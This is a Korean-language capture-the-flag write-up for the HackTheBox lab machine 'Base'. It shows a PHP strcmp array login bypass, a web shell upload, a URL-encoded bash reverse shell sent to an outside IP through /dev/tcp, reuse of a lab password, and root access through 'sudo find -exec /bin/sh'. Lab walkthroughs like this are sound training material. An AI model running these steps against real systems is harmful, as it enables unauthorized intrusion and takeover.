# Base - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA base 10.129.12.111
```
<img width="1104" height="394" alt="image" src="https://github.com/user-attachments/assets/5f9bf906-80cc-46c0-a502-6aa60c3ec535" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://10.129.12.111

curl -IL http://10.129.12.111
```
<img width="1104" height="342" alt="image" src="https://github.com/user-attachments/assets/622ae05b-01c2-4c79-8c03-9dbc60f67b80" />

---
### Login bypass
- `Login`탭만 다른 페이지로 연결이 되어 클릭해보니 `/login/login.php`로 연결됨.
<img width="1100" height="507" alt="image" src="https://github.com/user-attachments/assets/014da228-e91f-46d6-9e37-25f1a9947c71" />

<br>
<br>

- `/login/login.php`에서 `/login`에 접속 가능한지 시도.
<img width="452" height="318" alt="image" src="https://github.com/user-attachments/assets/85fafffb-e456-4a71-a19e-b3b1e95e24c3" />

<br>
<br>

- `login.php.swp`파일이 다운로드가 가능.
- `strings`를 사용하여 내용을 확인해보니 코드가 뒤집혀 있는 듯한 형태로 보임.
```bash
strings login.php.swp
```
<img width="747" height="351" alt="image" src="https://github.com/user-attachments/assets/b4b16627-e5b9-47b4-bce9-b999de0f9826" />

<br>
<br>

- `tac`를 사용하여 뒤집어 줌.
- `strcmp`함수는 비교하는 두개의 값이 같을 경우 혹은 비교가 불가능한 경우 `0`을 반환함.
- `PHP`에서 파라미터 값을 제대로 검사하지 않으면 `array`를 집어넣을 수 있게 된다.
```bash
strings login.php.swp | tac
```
<img width="766" height="364" alt="image" src="https://github.com/user-attachments/assets/7ce82780-5380-4c6e-ab03-818d037dd9fb" />

<br>
<br>

- `username`과 `password`파라미터를 `array`로 변경해서 요청하게 되면 값과 배열을 비교하게 되어 `NULL`값으로 반환하게 되어 로그인을 할 수 있게 된다.
<img width="775" height="372" alt="image" src="https://github.com/user-attachments/assets/3d32d3c5-db95-48c6-a80b-97340b0a14a9" />

<br>
<br>

- `upload.php`로 접속.
<img width="1000" height="420" alt="image" src="https://github.com/user-attachments/assets/677fb5bf-bef1-4119-963a-6349fa01f07d" />

---
### Upload
- 웹셸을 업로드 한 뒤에 `gobuster`로 어떤 경로가 있는지 확인해 보았으나, upload와 관련된 디렉토리가 발견되지 않았음.
```bash
gobuster dir -u http://base.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

- 힌트에서도 어떤 경로인지 찾을 수 없어, 다른 writeup을 참조해보니 `_uploaded`라는 경로로 발견됨.
- 웹셸 연결.
```
http://base.htb/_uploaded/simple-backdoor.php?cmd=whoami
```
<img width="779" height="80" alt="image" src="https://github.com/user-attachments/assets/da2608a0-4f2d-41f8-a7dc-ed8da4d8c243" />

<br>
<br>

-  셸 획득.
```bash
curl http://base.htb/_uploaded/simple-backdoor.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.240%2F80%200%3E%261%22%0A
```
<img width="1104" height="77" alt="image" src="https://github.com/user-attachments/assets/7b2140f6-ee46-43c4-921e-dd2f89aace23" />

<br>
<br>

<img width="796" height="178" alt="image" src="https://github.com/user-attachments/assets/e29ae9ac-8027-4303-8830-ee23440e9718" />

---
## Privesc
- `/var/www/html/login/config.php`에서 비밀번호 발견.
<img width="709" height="79" alt="image" src="https://github.com/user-attachments/assets/a8b66b99-e237-49fa-9193-732562e869b8" />

<br>
<br>

- `/etc/passwd`에서 `john`유저 발견.
<img width="957" height="58" alt="image" src="https://github.com/user-attachments/assets/1fbc5531-1a4f-465f-bd89-e0708543c923" />

<br>
<br>

- `john:thisisagoodpassword`으로 로그인.
```bash
su - john
```
<img width="957" height="80" alt="image" src="https://github.com/user-attachments/assets/87fc6c53-1323-40d2-8358-c70a9177614b" />

<br>
<br>

- `root`권한으로 `find` 명령어를 사용 가능.
```bash
sudo -l
```
<img width="1103" height="138" alt="image" src="https://github.com/user-attachments/assets/de304a2a-9d45-43c7-9dc7-65da4f08f0b7" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/find/
- `GTFOBIN`을 참조하여 `find`로 root권한 획득.
```bash
sudo find . -exec /bin/sh \; -quit
```
<img width="1103" height="62" alt="image" src="https://github.com/user-attachments/assets/3bbd0e8d-dc79-40d8-9b02-c9fcbc615233" />

---
## FLAG
- `/home/john/user.txt`
<img width="1103" height="232" alt="image" src="https://github.com/user-attachments/assets/475e65dc-ae7c-4579-853a-1940aa539a84" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="232" alt="image" src="https://github.com/user-attachments/assets/f16dd3fb-076f-4e5d-ac22-1fffa98b94f5" />






